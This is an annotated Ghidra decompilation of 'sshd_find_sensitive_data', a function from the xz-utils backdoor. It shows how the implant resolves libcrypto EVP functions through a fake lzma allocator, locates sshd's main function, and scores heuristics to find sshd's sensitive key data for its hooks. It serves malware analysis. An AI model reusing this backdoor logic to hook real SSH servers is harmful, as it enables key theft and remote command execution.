// /home/kali/xzre-ghidra/xzregh/105410_sshd_find_sensitive_data.c
// Function: sshd_find_sensitive_data @ 0x105410
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_find_sensitive_data(elf_info_t * sshd, elf_info_t * libcrypto, string_references_t * refs, imported_funcs_t * funcs, global_context_t * ctx)


/*
 * AutoDoc: Bootstraps the entire sensitive-data pipeline: it appends bookkeeping entries for `sshd_proxy_elevate`/socket helpers into the secret-data log, uses the fake lzma allocator (pointed at libcrypto) to resolve `EVP_PKEY_new_raw_public_key`, `EVP_Digest`, `EVP_DigestVerify`, `EVP_DigestVerifyInit`, `EVP_CIPHER_CTX_new`, `EVP_chacha20`, and sanity-checks that the library exports the `EVP_sm*` family the payload expects. It locates sshd's code/data segments, finds the real `sshd_main` entry (recording whether an ENDBR64 prefix is present), and runs both the xcalloc-based and `KRB5CCNAME` heuristics to recover candidate struct addresses. Each candidate is scored via `sshd_get_sensitive_data_score`, and whichever pointer clears the >=8 threshold is stored in `ctx->sshd_sensitive_data`; on failure all of the just-resolved libcrypto stubs are freed before the helper reports that no recon data was found.
 */

#include "xzre_types.h"

BOOL sshd_find_sensitive_data
               (elf_info_t *sshd,elf_info_t *libcrypto,string_references_t *refs,
               imported_funcs_t *funcs,global_context_t *ctx)

{
  Elf64_Addr EVar1;
  Elf64_Ehdr *pEVar2;
  u64 uVar3;
  u64 uVar4;
  u8 *code_start;
  u8 *code_segment_end;
  BOOL operation_ok;
  BOOL krb_candidate_found;
  uint xzcalloc_score;
  uint krb_score;
  lzma_allocator *allocator;
  pfn_EVP_DigestVerifyInit_t digest_verify_init;
  void *text_segment;
  Elf64_Sym *digest_verify_sym;
  Elf64_Sym *evp_sm_sym;
  u8 *data_start;
  pfn_EVP_CIPHER_CTX_new_t cipher_ctx_new;
  pfn_EVP_chacha20_t chacha20_ctor;
  long probe_clear_idx;
  secret_data_item_t *probe_cursor;
  sensitive_data *winning_candidate;
  u8 zero_stride;
  u64 code_segment_size;
  u64 data_segment_size;
  u8 *sshd_main_addr;
  u8 *code_scan_limit;
  sensitive_data *krb_candidate_local;
  sensitive_data *xzcalloc_candidate_local;
  secret_data_item_t secret_probe_items;
  code *run_backdoor_entry;
  u64 run_backdoor_descriptor;
  u64 usable_socket_descriptor;
  code *usable_socket_entry;
  u64 usable_socket_opcode;
  u64 client_socket_descriptor;
  code *client_socket_entry;
  u64 client_socket_opcode;
  u64 client_socket_flags;
  
  zero_stride = 0;
  // AutoDoc: Emit breadcrumbs for the monitor command handlers so later refreshes can see that the recon code ran.
  operation_ok = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x1c8,0,0x1d);
  if (operation_ok == FALSE) {
    return FALSE;
  }
  run_backdoor_descriptor = 0x1b000001c8;
  // AutoDoc: Pre-populate a four-entry batch that records the proxy elevate helper plus the monitor socket discovery routines.
  secret_probe_items.anchor_pc = (u8 *)sshd_proxy_elevate;
  secret_probe_items.bit_cursor = (secret_data_shift_cursor_t)0x1c8;
  secret_probe_items.operation_slot = 0x1c;
  run_backdoor_entry = run_backdoor_commands;
  secret_probe_items.bits_to_shift = 0;
  secret_probe_items.ordinal = 1;
  usable_socket_descriptor = 0x100000000;
  usable_socket_entry = sshd_get_usable_socket;
  usable_socket_opcode = 0x1a000001c3;
  client_socket_descriptor = 0x100000005;
  client_socket_entry = sshd_get_client_socket;
  client_socket_opcode = 0x19000001bd;
  client_socket_flags = 0x100000006;
  // AutoDoc: Push all four breadcrumbs into the log in one shot; a failure here aborts before any ELF parsing happens.
  operation_ok = secret_data_append_items(&secret_probe_items,4,secret_data_append_item);
  if (operation_ok == FALSE) {
    return FALSE;
  }
  probe_cursor = &secret_probe_items;
  for (probe_clear_idx = 0x18; probe_clear_idx != 0; probe_clear_idx = probe_clear_idx + -1) {
    *(undefined4 *)&probe_cursor->anchor_pc = 0;
    probe_cursor = (secret_data_item_t *)((long)probe_cursor + (ulong)zero_stride * -8 + 4);
  }
  code_segment_size = 0;
  data_segment_size = 0;
  sshd_main_addr = (u8 *)0x0;
  code_scan_limit = (u8 *)0x0;
  krb_candidate_local = (sensitive_data *)0x0;
  xzcalloc_candidate_local = (sensitive_data *)0x0;
  // AutoDoc: Point the fake lzma allocator at libcrypto so subsequent `lzma_alloc` calls actually resolve EVP helpers.
  allocator = get_lzma_allocator();
  // AutoDoc: Remember the target image so the allocator resolves symbols inside libcrypto instead of sshd.
  allocator->opaque = libcrypto;
  // AutoDoc: Resolve and pin each crypto helper by allocating a stub from libcrypto; success bumps `resolved_imports_count`.
  digest_verify_init = (pfn_EVP_DigestVerifyInit_t)lzma_alloc(0x118,allocator);
  funcs->EVP_DigestVerifyInit = digest_verify_init;
  if (digest_verify_init != (pfn_EVP_DigestVerifyInit_t)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  // AutoDoc: Grab sshd’s text segment (and later the data segment) so both heuristics operate on real in-memory bounds.
  text_segment = elf_get_code_segment(sshd,&code_segment_size);
  uVar3 = code_segment_size;
  if (text_segment == (void *)0x0) {
    return FALSE;
  }
  // AutoDoc: Check that libcrypto export tables still contain the EVP entry points the payload expects to hijack.
  digest_verify_sym = elf_symbol_get(libcrypto,STR_EVP_DigestVerify,0);
  evp_sm_sym = elf_symbol_get(libcrypto,STR_EVP_sm,0);
  if (evp_sm_sym == (Elf64_Sym *)0x0) {
    return FALSE;
  }
  data_start = (u8 *)elf_get_data_segment(sshd,&data_segment_size,FALSE);
  uVar4 = data_segment_size;
  if (data_start == (u8 *)0x0) {
    return FALSE;
  }
  if (digest_verify_sym != (Elf64_Sym *)0x0) {
    EVar1 = digest_verify_sym->st_value;
    pEVar2 = libcrypto->elfbase;
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
    funcs->EVP_DigestVerify = (pfn_EVP_DigestVerify_t)(pEVar2->e_ident + EVar1);
  }
  cipher_ctx_new = (pfn_EVP_CIPHER_CTX_new_t)lzma_alloc(0x838,allocator);
  funcs->EVP_CIPHER_CTX_new = cipher_ctx_new;
  if (cipher_ctx_new != (pfn_EVP_CIPHER_CTX_new_t)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  // AutoDoc: Locate the actual `main()` body and remember its address for later scoring and hook decisions.
  operation_ok = sshd_find_main(&sshd_main_addr,sshd,libcrypto,funcs);
  code_start = sshd_main_addr;
  if (operation_ok == FALSE) {
    return FALSE;
  }
  ctx->sshd_main_entry = sshd_main_addr;
  // AutoDoc: Capture whether sshd used CET/ENDBR64 so downstream patches can keep the landing pad intact.
  operation_ok = is_endbr64_instruction(sshd_main_addr,sshd_main_addr + 4,0xe230);
  ctx->uses_endbr64 = (uint)(operation_ok != FALSE);
  code_segment_end = (u8 *)((long)text_segment + uVar3);
  if ((operation_ok != FALSE) &&
     (operation_ok = find_function(code_start,(void **)0x0,&code_scan_limit,code_start,
                            (u8 *)((long)text_segment + uVar3),FIND_NOP), code_segment_end = code_scan_limit,
     operation_ok == FALSE)) {
    return FALSE;
  }
  code_scan_limit = code_segment_end;
  // AutoDoc: Use the xcalloc heuristic to find a struct candidate by following the xcalloc(result) stores into .bss.
  operation_ok = sshd_get_sensitive_data_address_via_xcalloc
                    (data_start,data_start + uVar4,code_start,code_scan_limit,refs,&xzcalloc_candidate_local);
  // AutoDoc: Run the independent KRB5CCNAME-based scan in parallel so two separate heuristics can vote on the same address.
  krb_candidate_found = sshd_get_sensitive_data_address_via_krb5ccname
                    (data_start,data_start + uVar4,code_start,code_scan_limit,&krb_candidate_local,sshd);
  chacha20_ctor = (pfn_EVP_chacha20_t)lzma_alloc(0xc28,allocator);
  winning_candidate = xzcalloc_candidate_local;
  funcs->EVP_chacha20 = chacha20_ctor;
  if (chacha20_ctor != (pfn_EVP_chacha20_t)0x0) {
    funcs->resolved_imports_count = funcs->resolved_imports_count + 1;
  }
  if (operation_ok == FALSE) {
LAB_00105772:
    if (krb_candidate_found == FALSE) goto LAB_001057d3;
    xzcalloc_score = 0;
LAB_001057a6:
    krb_score = sshd_get_sensitive_data_score(krb_candidate_local,sshd,refs);
  }
  else {
    if (krb_candidate_found != FALSE) {
      if (xzcalloc_candidate_local == krb_candidate_local) {
        // AutoDoc: Score whichever candidate(s) were recovered; the function only accepts pointers that reach eight or more points.
        xzcalloc_score = sshd_get_sensitive_data_score(xzcalloc_candidate_local,sshd,refs);
        if (xzcalloc_score < 8) {
          return FALSE;
        }
        goto LAB_0010575e;
      }
      xzcalloc_score = sshd_get_sensitive_data_score(xzcalloc_candidate_local,sshd,refs);
      goto LAB_001057a6;
    }
    if (operation_ok == FALSE) goto LAB_00105772;
    xzcalloc_score = sshd_get_sensitive_data_score(xzcalloc_candidate_local,sshd,refs);
    krb_score = 0;
  }
  if (((krb_score <= xzcalloc_score) && (winning_candidate = xzcalloc_candidate_local, 7 < xzcalloc_score)) ||
     ((xzcalloc_score <= krb_score && (winning_candidate = krb_candidate_local, 7 < krb_score)))) {
LAB_0010575e:
    // AutoDoc: Persist the winning pointer into the global context so every hook can dereference sshd’s sensitive_data struct.
    ctx->sshd_sensitive_data = winning_candidate;
    return TRUE;
  }
LAB_001057d3:
  // AutoDoc: Tear down any temporary EVP handles when discovery fails so the loader does not leak libcrypto objects.
  lzma_free(funcs->EVP_DigestVerifyInit,allocator);
  lzma_free(funcs->EVP_CIPHER_CTX_new,allocator);
  lzma_free(funcs->EVP_chacha20,allocator);
  return FALSE;
}

